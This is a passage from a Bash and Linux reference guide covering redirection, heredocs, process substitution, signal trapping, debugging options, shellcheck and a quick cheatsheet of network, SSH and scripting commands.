if [[ -v config["host"] ]]; then
    echo "host is set"
fi

# All keys
echo "${!config[@]}"

# All values
echo "${config[@]}"

# Number of entries
echo "${#config[@]}"

# Iterate over key-value pairs
for key in "${!config[@]}"; do
    echo "$key = ${config[$key]}"
done

# Delete a key
unset config["port"]

# Delete the entire array
unset config
```

---

## 14. I/O redirection

### 14.1 Standard streams

| FD | Name | Default |
|----|------|---------|
| 0 | stdin | keyboard |
| 1 | stdout | terminal |
| 2 | stderr | terminal |

---

### 14.2 Redirection operators

```bash
# Redirect stdout to file (overwrite)
ls -la > output.txt

# Redirect stdout to file (append)
ls -la >> output.txt

# Redirect stderr to file
command 2> error.log

# Redirect stderr to stdout (combine into one stream)
command 2>&1
command 2>&1 | less        # pipe stderr and stdout together

# Redirect both stdout and stderr to a file
command > output.log 2>&1
command &> output.log      # bash shorthand
command &>> output.log     # append both

# Discard stdout
command > /dev/null

# Discard stderr
command 2> /dev/null

# Discard everything
command &> /dev/null
command > /dev/null 2>&1   # explicit, compatible form

# Redirect stdin from file
command < input.txt

# Redirect stdout and read stdin from file
command < input.txt > output.txt
```

**Critical ordering note:** `2>&1 > file` and `> file 2>&1` are different:
- `> file 2>&1` — stdout goes to file, stderr goes to where stdout points (the file) ✓
- `2>&1 > file` — stderr goes to where stdout currently points (terminal), then stdout goes to file ✗

---

### 14.3 Here-documents (heredoc)

```bash
# Basic heredoc — indented by convention but content is not stripped
cat << 'EOF'
This is literal text.
$VARIABLES are not expanded.
`backticks` are not executed.
EOF

# Heredoc with variable expansion (no quotes around delimiter)
name="Adam"
cat << EOF
Hello, $name
Today is $(date)
EOF

# Indented heredoc (strip leading tabs) — use <<- (only tabs, not spaces)
if true; then
    cat <<- EOF
        This text has leading tabs stripped.
        Only tab indentation works.
	EOF
fi

# Feed heredoc to command
mysql -u root -p <<EOF
USE mydb;
SELECT * FROM users;
EOF

# Assign heredoc to variable
sql=$(cat <<EOF
SELECT id, name
FROM users
WHERE active = 1
ORDER BY name;
EOF
)

# Write heredoc to file
cat > /etc/nginx/sites-available/mysite << 'NGINX'
server {
    listen 80;
    server_name example.com;
    root /var/www/html;
}
NGINX
```

---

### 14.4 Here-strings

```bash
# Feed a single string as stdin (no subshell, unlike echo | command)
grep "pattern" <<< "string to search"
wc -w <<< "count these words"
read -r first last <<< "John Doe"
echo "$first $last"   # John Doe

# Useful for passing variables
base64 <<< "$encoded_data"
python3 <<< "print('hello from Python')"

# Here-string vs. echo pipe:
# echo "text" | command    — creates a subshell
# command <<< "text"       — no subshell (faster for simple strings)
```

---

### 14.5 Process substitution

```bash
# <() — command output as a file-like object
# Useful for commands that expect filenames

# diff two command outputs without temp files
diff <(ls /dir1) <(ls /dir2)
diff <(sort file1.txt) <(sort file2.txt)

# Compare output of remote and local command
diff <(ssh remote 'ls /data') <(ls /local/data)

# Feed command output to while read
while IFS= read -r line; do
    echo "Line: $line"
done < <(find /var/log -name "*.log" -newer /tmp/marker)

# >() — write to a process as if it were a file
# Redirect to multiple outputs
tee >(gzip > output.gz) >(wc -l) > /dev/null

# Log and process simultaneously
command | tee >(logger -t myapp) >(grep ERROR >> errors.log)
```

---

### 14.6 Pipe and pipeline details

```bash
# Basic pipe — stdout of left becomes stdin of right
ls -la | grep ".conf"
cat /var/log/syslog | grep ERROR | tail -20

# Pipe stderr through pipe — use group command or bash 4 pipefail
{ command 2>&1; } | grep pattern

# Named pipes (FIFO)
mkfifo /tmp/mypipe
command1 > /tmp/mypipe &
command2 < /tmp/mypipe
rm /tmp/mypipe

# Check if stdin is a terminal or a pipe
if [ -t 0 ]; then
    echo "stdin is a terminal"
else
    echo "stdin is a pipe or file"
fi
```

---

## 15. Signal handling

### 15.1 trap

```bash
# Syntax: trap 'command' SIGNAL [SIGNAL...]
# SIGNAL can be name (EXIT, INT, TERM) or number (0, 2, 15)

# Cleanup on exit (runs on any exit, including errors)
cleanup() {
    echo "Cleaning up..."
    rm -f /tmp/myscript.lock
    rm -f /tmp/work_*.tmp
}
trap cleanup EXIT

# Handle Ctrl+C (SIGINT)
trap 'echo "Interrupted! Cleaning up..."; cleanup; exit 1' INT

# Handle SIGTERM (kill command)
trap 'echo "Terminated"; cleanup; exit 0' TERM

# Handle both
trap 'cleanup; exit 130' INT TERM

# Ignore a signal
trap '' INT           # ignore Ctrl+C

# Reset signal to default behavior
trap - INT            # restore default Ctrl+C behavior

# ERR trap — runs when any command returns non-zero
trap 'echo "Error on line $LINENO: command returned $?"' ERR

# Common robust error handler
error_handler() {
    local exit_code=$?
    local line_number=$1
    echo "ERROR: line $line_number exited with code $exit_code" >&2
    cleanup
    exit "$exit_code"
}
trap 'error_handler $LINENO' ERR

# SIGHUP (1) — terminal hangup
trap 'echo "SIGHUP received — reloading config"; reload_config' HUP

# Full robust pattern
set -euo pipefail
TMPDIR=$(mktemp -d)
trap 'rm -rf "$TMPDIR"' EXIT
# ... use $TMPDIR freely — it will always be cleaned up
```

### 15.2 Common signals

| Signal | Number | Meaning | Default action |
|--------|--------|---------|----------------|
| `SIGHUP` | 1 | Hangup (terminal closed) | Terminate |
| `SIGINT` | 2 | Interrupt (Ctrl+C) | Terminate |
| `SIGQUIT` | 3 | Quit (Ctrl+\) | Core dump |
| `SIGKILL` | 9 | Kill (cannot be caught) | Terminate |
| `SIGTERM` | 15 | Terminate (graceful kill) | Terminate |
| `SIGSTOP` | 19 | Stop (cannot be caught) | Stop |
| `SIGTSTP` | 20 | Stop (Ctrl+Z) | Stop |
| `SIGUSR1` | 10 | User-defined 1 | Terminate |
| `SIGUSR2` | 12 | User-defined 2 | Terminate |
| `EXIT` | 0 | Script exit | — |

```bash
# Send signals
kill -15 PID           # SIGTERM (graceful)
kill -9 PID            # SIGKILL (force)
kill -HUP PID          # reload (for daemons)
kill -0 PID            # check if process exists (no signal sent)
killall nginx          # by process name
pkill -f "python.*app" # by regex match on command line

# List all signals
kill -l
```

---

## 16. Debugging

### 16.1 set options

```bash
#!/usr/bin/env bash

# Exit immediately on any error (single command returns non-zero)
set -e
# OR:
set -o errexit

# Treat unset variables as errors (instead of expanding to empty string)
set -u
# OR:
set -o nounset
# Note: $@ and $* are safe even under -u when called with no args
# Use "${var:-}" or "${1:-}" for intentionally optional variables

# Fail if any command in a pipeline fails (default: only last command)
set -o pipefail
# Example without pipefail: false | echo "ok" → exit 0 (misleading)
# With pipefail: false | echo "ok" → exit 1 (correct)

# Print each command before executing (trace mode)
set -x
# OR:
set -o xtrace
# Output looks like: + echo "hello"
# Variable values are expanded in output

# All four combined — common defensive scripting pattern
set -euxo pipefail

# Enable in specific sections only
set -x
risky_command
set +x      # turn off trace

# Subshell inherits set options from parent (with 'export' or inheritance)
# But explicitly set them in sourced scripts too

# No glob (disable pathname expansion)
set -f    # useful when processing filenames that might contain * ? []
set +f    # re-enable

# errexit interaction: use || to handle expected failures
if grep -q "pattern" file.txt; then   # grep returns 1 if no match
    echo "Found"
fi
# vs (will exit under -e if pattern not found):
# grep -q "pattern" file.txt  ← DON'T do this under set -e without ||

# Safe pattern under -e:
grep -q "pattern" file.txt || true     # ignore non-zero
grep -q "pattern" file.txt && echo "found" || true
result=$(grep "pattern" file.txt || true)   # capture without failing
```

---

### 16.2 Debugging techniques

```bash
# Trace specific lines
set -x
suspect_code
set +x

# Print variable states
echo "DEBUG: var=$var, count=$count" >&2    # send debug to stderr

# Show expanded command
bash -x myscript.sh              # run with tracing
bash -n myscript.sh              # syntax check only (no execution)
bash -v myscript.sh              # verbose: print each line as read
bash -xv myscript.sh             # both

# Trace with line numbers in PS4
export PS4='+(${BASH_SOURCE}:${LINENO}): ${FUNCNAME[0]:+${FUNCNAME[0]}(): }'
set -x

# Check last command's exit code immediately
command
echo "Exit code: $?"

# Trace to file (useful when output is noisy)
bash -x myscript.sh 2> trace.log
exec 2> >(tee trace.log)    # fork stderr to tee

# Assert function
assert() {
    local condition="$1"
    local message="${2:-Assertion failed}"
    eval "$condition" || { echo "ASSERT: $message (at line ${BASH_LINENO[0]})" >&2; exit 1; }
}
assert '[ -f /etc/passwd ]' "/etc/passwd should exist"
assert '[ "$count" -gt 0 ]' "count should be positive"

# BASH_SOURCE, LINENO, FUNCNAME arrays
debug_info() {
    echo "Called from: ${BASH_SOURCE[1]}:${BASH_LINENO[0]} in ${FUNCNAME[1]}"
}

# Check for syntax errors before running
if ! bash -n myscript.sh; then
    echo "Syntax errors found" >&2
    exit 1
fi
bash myscript.sh
```

---

### 16.3 shellcheck

`shellcheck` is a static analysis tool for shell scripts — catches common bugs, bad practices, and portability issues.

```bash
# Install
apt install shellcheck        # Debian/Ubuntu
yum install shellcheck        # RHEL/CentOS
brew install shellcheck       # macOS

# Check a script
shellcheck myscript.sh

# Check multiple scripts
shellcheck *.sh

# Show all info/warning/error messages
shellcheck -S style myscript.sh    # include style suggestions
shellcheck -S info myscript.sh     # include info messages

# Specify shell dialect
shellcheck -s bash myscript.sh
shellcheck -s sh myscript.sh       # check for POSIX compliance

# Exclude specific checks
shellcheck -e SC2034 myscript.sh   # ignore SC2034 (unused variable)

# Format output
shellcheck -f json myscript.sh     # JSON output for tooling
shellcheck -f gcc myscript.sh      # GCC-style format (for editor integration)

# In CI: non-zero exit code means issues found
shellcheck myscript.sh && echo "Passed"

# Inline disable (use sparingly)
# shellcheck disable=SC2034
unused_var="value"

# Disable for a block
# shellcheck disable=SC2034,SC2086
complex_code
# shellcheck enable=SC2034,SC2086
```

**Common shellcheck codes:**

| Code | Issue |
|------|-------|
| SC2034 | Variable appears unused |
| SC2086 | Double-quote to prevent word splitting |
| SC2046 | Double-quote to prevent word splitting (in $()) |
| SC2006 | Use $() instead of backticks |
| SC2164 | cd to directory might fail; use `cd ... \|\| exit` |
| SC2068 | Double-quote array to prevent splitting |
| SC2155 | Declare and assign separately to avoid masking return values |
| SC2181 | Check exit code directly (`if command;` not `if [ $? -eq 0 ]`) |

---

## Quick Reference Cheatsheet

### Network

```bash
# What is listening on port X?
ss -tlnp | grep :PORT
lsof -i :PORT

# Who is using all the bandwidth?
nethogs eth0
iftop -i eth0

# What is my public IP?
curl -s https://ifconfig.me
dig +short myip.opendns.com @resolver1.opendns.com

# Full network diagnostic sequence
ip addr show
ip route show
cat /etc/resolv.conf
ping -c3 8.8.8.8        # test layer 3
dig google.com          # test DNS
curl -I https://google.com  # test HTTP
```

### SSH quick ops

```bash
# Quick tunnel in background
ssh -fN -L 5432:localhost:5432 user@dbserver

# Copy your key to a new server
ssh-copy-id -i ~/.ssh/id_ed25519.pub user@newserver

# Add host key without connecting
ssh-keyscan -H hostname >> ~/.ssh/known_hosts

# Kill a stalled SSH session (escape sequence)
# Press Enter, then ~, then .
```

### Bash quick ops

```bash
# Strict mode header (use at top of every script)
#!/usr/bin/env bash
set -euo pipefail

# Safe temp directory with auto-cleanup
TMPDIR=$(mktemp -d)
trap 'rm -rf "$TMPDIR"' EXIT

# Check required commands exist
for cmd in curl jq python3; do
    command -v "$cmd" >/dev/null 2>&1 || { echo "Required: $cmd"; exit 1; }
done

# Read password without echo
read -r -s -p "Password: " password
echo

# Confirm prompt
read -r -p "Continue? [y/N] " response
[[ "$response" =~ ^[Yy]$ ]] || exit 0
```

---

*Document generated 2026-04-25 — Zia Venture Group / Adam Lynch*
